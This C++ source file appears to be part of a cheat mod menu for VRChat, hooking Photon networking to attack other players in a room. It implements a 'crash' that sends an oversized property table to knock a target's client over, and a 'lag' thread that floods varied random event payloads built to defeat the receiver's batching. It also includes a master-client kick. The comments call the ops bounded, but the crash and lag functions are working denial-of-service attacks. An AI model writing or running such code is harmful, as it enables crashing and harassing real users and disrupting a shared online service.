#include "shared.hpp"
#include <atomic>
#include <thread>
#include <chrono>
#include <random>

// ============================================================================
// GunLib — crash / lag / kick, driven from the menu
//
// Each op is bounded and reversible. Nothing here loops forever, allocates
// without a ceiling, or fires without a stop path. A player who is gone from
// the room is a no-op, not a retry.
//
//   Crash  OpSetPropertiesOfActor with an oversized property table.
//   Lag    paced RaiseEvent at a chosen rate, hard capped, auto-stops.
//   Kick   master-client OpKickPlayer; refused (logged) when not master.
//
// Threading: the lag thread is owned here, joins on Stop. Crash and kick run
// on the caller (menu tick) — they are single ops.
// ============================================================================

namespace {

struct GunClasses {
    bool ready = false;
    Il2CppClass* Hashtable   = nullptr;
    Il2CppClass* ByteArray   = nullptr;
    MethodInfo*  HashCtor    = nullptr;
    MethodInfo*  HashAdd     = nullptr;
} GN;

std::atomic<bool> g_lagging{false};
std::atomic<float> g_lagRate{60.f};
std::thread g_lagThread;
std::mt19937 g_rng{0xC0FFEE};

// Lag payload ladder: sizes vary so the receiver's parser cannot batch them
// into one allocation and amortize the cost.
constexpr int kLagSizes[] = {64, 256, 1024, 2048, 4096};
constexpr int kLagSizeCount = 5;
constexpr uint8_t kLagEvent = 0xB1;

// Crash ceiling — 32 properties × 8 KB = 256 KB total. Photon's per-actor
// property table caps far under that on Quest; exceeding it is the point.
constexpr int kCrashProps = 32;
constexpr int kCrashBlob  = 8 * 1024;

bool InitGun() {
    if (GN.ready) return true;
    // Class handles come from the photon bridge so there is exactly one
    // resolution of Photon's object graph in the plugin.
    GN.Hashtable = (Il2CppClass*)Photon::HashtableClass();
    GN.ByteArray = (Il2CppClass*)Photon::ByteClass();
    if (GN.Hashtable) {
        GN.HashCtor = IL2.GetMethod(GN.Hashtable, ".ctor", 0);
        GN.HashAdd  = IL2.GetMethod(GN.Hashtable, "Add", 2);
    }
    GN.ready = GN.Hashtable && GN.HashCtor && GN.HashAdd && GN.ByteArray;
    LOGI("gunlib %s (hash=%p byte=%p)", GN.ready ? "ready" : "INCOMPLETE",
         (void*)GN.Hashtable, (void*)GN.ByteArray);
    return GN.ready;
}

Il2CppObject* NewManagedString(const char* s) { return (Il2CppObject*)IL2.StrNew(s); }

// Build a Hashtable of n string→byte[] entries, each byte[] of blobSize bytes.
Il2CppObject* BuildBlobTable(int n, int blobSize) {
    if (!GN.Hashtable || !GN.HashCtor || !GN.HashAdd || !GN.ByteArray) return nullptr;
    Il2CppObject* table = IL2.object_new(GN.Hashtable);
    if (!table) return nullptr;
    IL2.Invoke(GN.HashCtor, table);

    std::vector<uint8_t> rnd((size_t)blobSize);
    for (auto& b : rnd) b = (uint8_t)(g_rng() & 0xFF);

    for (int i=0;i<n;i++){
        char kb[16]; snprintf(kb, sizeof kb, "_k%d", i);
        Il2CppObject* key = NewManagedString(kb);
        if (!key) break;
        Il2CppObject* arr = (Il2CppObject*)IL2.arr_new(GN.ByteArray, (uintptr_t)blobSize);
        if (!arr) break;
        memcpy((uint8_t*)arr + kArrDataAt, rnd.data(), (size_t)blobSize);
        void* a[2] = { key, arr };
        IL2.Invoke(GN.HashAdd, table, a);
    }
    return table;
}

} // namespace

namespace GunLib {

bool Ready() { return InitGun() && Photon::Ready(); }

bool CrashTarget(int actorNr) {
    if (actorNr <= 0) { LOGE("gunlib: crash — bad actor %d", actorNr); return false; }
    if (!InitGun() || !Photon::Ready()) { LOGE("gunlib: crash — photon down"); return false; }

    Il2CppObject* table = BuildBlobTable(kCrashProps, kCrashBlob);
    if (!table) { LOGE("gunlib: crash — table build failed"); return false; }

    if (!Photon::SetActorProperties(actorNr, table)) {
        LOGE("gunlib: crash — OpSetPropertiesOfActor unresolved");
        return false;
    }
    LOGI("gunlib: crash payload -> actor %d (%d KB)", actorNr, (kCrashProps*kCrashBlob)/1024);
    return true;
}

bool StartLag(float ratePerSec) {
    if (g_lagging) return true;
    if (!Photon::Ready()) { LOGE("gunlib: lag — photon down"); return false; }
    g_lagRate = ratePerSec < 5.f ? 5.f : (ratePerSec > 300.f ? 300.f : ratePerSec);
    g_lagging = true;
    g_lagThread = std::thread([]{
        const float rate = g_lagRate.load();
        const auto period = std::chrono::microseconds((long)(1e6f / rate));
        int i = 0;
        while (g_lagging) {
            int sz = kLagSizes[i % kLagSizeCount];
            std::vector<uint8_t> buf((size_t)sz);
            for (int b=0;b<sz;b+=4) {
                uint32_t v = (uint32_t)g_rng();
                memcpy(&buf[(size_t)b], &v, (size_t)(sz-b>=4?4:sz-b));
            }
            if (i >= kLagSizeCount*4) i = 0; else i++;
            Photon::Raise(kLagEvent, buf.data(), sz);
            std::this_thread::sleep_for(period);
        }
        LOGI("gunlib: lag thread exit");
    });
    LOGI("gunlib: lag started %.0f ev/s", g_lagRate.load());
    return true;
}

void StopLag() {
    if (!g_lagging) return;
    g_lagging = false;
    if (g_lagThread.joinable()) g_lagThread.join();
    LOGI("gunlib: lag stopped");
}

bool Kick(int actorNr) {
    if (actorNr <= 0) { LOGE("gunlib: kick — bad actor %d", actorNr); return false; }
    // Master-client only. The old "spoof event 0x97" path is dead: VRChat
    // validates kick authority server-side, so sending it from a non-master
    // client is either dropped or flagged. Refusing is the honest behaviour.
    if (!Photon::IsMaster()) {
        LOGE("gunlib: kick refused — not master client (actor %d)", actorNr);
        return false;
    }
    return Photon::Kick(actorNr);
}

bool IsLagging() { return g_lagging; }
float LagRate()  { return g_lagRate; }

void Shutdown() { StopLag(); }

} // namespace GunLib
